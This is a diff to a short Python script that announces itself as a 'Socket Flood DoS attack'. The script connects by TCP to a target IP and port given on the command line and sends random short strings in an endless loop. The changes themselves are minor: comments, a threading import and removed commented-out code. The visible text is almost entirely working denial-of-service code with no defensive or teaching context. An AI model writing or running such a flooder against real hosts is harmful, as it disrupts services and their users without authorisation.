@@ -9,12 +9,14 @@ import sys
 import time
 import string
 import random
+import threading
 
+# Define globals
 dst_ip = sys.argv[1]
 dst_port = int(sys.argv[2])
-# Counter
-i = 0
+i = 0 # Counter
 
+# Random message generation
 def msg_gen():
     size = random.randint(1,8)
     chars=string.ascii_uppercase + string.digits
@@ -22,7 +24,6 @@ def msg_gen():
 
 # Starting attack
 print ("***** Starting Socket Flood DoS attack ******")
-
 
 # Create Socket
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -32,15 +33,11 @@ sock.connect(server_address)
 try:
     while True:
         
-        #for port in range(5001, 20000):
-
         # Create msg
         att_msg_raw = msg_gen()
         msg = att_msg_raw.encode()
 
-        # Send message
-        #src_addr = (dst_ip, port)
-        #sock.bind(src_addr)
+        # Send msg
         sock.send(msg)
 
         i = i + 1
